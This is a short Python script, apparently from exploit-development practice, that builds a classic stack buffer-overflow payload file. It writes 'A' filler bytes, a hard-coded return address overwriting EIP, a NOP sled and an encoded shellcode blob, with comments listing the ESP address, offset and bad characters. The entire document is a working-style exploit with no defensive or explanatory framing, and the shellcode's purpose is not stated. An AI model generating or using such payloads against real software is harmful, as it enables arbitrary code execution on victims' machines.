#ESP=0x148011b2
#filler=1230, eip=4, offset=22 --> ESP
#Bad chars: {\x00, \x0a, \x1a, \x1b, \x69, \xAE, \xCE

text_file_byte = open("exploit.txt","wb")

filler=b'\x41'*1252
eip=b'\xb2\x11\x80\x14'
buffer=b'\xda\xd1\xba\x27\xa2\x5a\xa0\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x31\x83\xc7\x04\x31\x57\x13\x03\x70\xb1\xb8\x55\x82\x5d\xbe\x96\x7a\x9e\xdf\x1f\x9f\xaf\xdf\x44\xd4\x80\xef\x0f\xb8\x2c\x9b\x42\x28\xa6\xe9\x4a\x5f\x0f\x47\xad\x6e\x90\xf4\x8d\xf1\x12\x07\xc2\xd1\x2b\xc8\x17\x10\x6b\x35\xd5\x40\x24\x31\x48\x74\x41\x0f\x51\xff\x19\x81\xd1\x1c\xe9\xa0\xf0\xb3\x61\xfb\xd2\x32\xa5\x77\x5b\x2c\xaa\xb2\x15\xc7\x18\x48\xa4\x01\x51\xb1\x0b\x6c\x5d\x40\x55\xa9\x5a\xbb\x20\xc3\x98\x46\x33\x10\xe2\x9c\xb6\x82\x44\x56\x60\x6e\x74\xbb\xf7\xe5\x7a\x70\x73\xa1\x9e\x87\x50\xda\x9b\x0c\x57\x0c\x2a\x56\x7c\x88\x76\x0c\x1d\x89\xd2\xe3\x22\xc9\xbc\x5c\x87\x82\x51\x88\xba\xc9\x3f\x4f\x48\x74\x0d\x4f\x52\x76\x22\x38\x63\xfd\xad\x3f\x7c\xd4\x89\xa0\x9e\xfc\xe7\x48\x07\x95\x45\x15\xb8\x40\x89\x20\x3b\x60\x72\xd7\x23\x01\x77\x93\xe3\xfa\x05\x8c\x81\xfc\xba\xad\x83\x9f\x51\x36\x02\x3a\xd2\xd3\x5a'
nops =b'\x90'*16

text_file_byte.write(filler)
text_file_byte.write(eip)
text_file_byte.write(nops)
text_file_byte.write(buffer)


print("done")
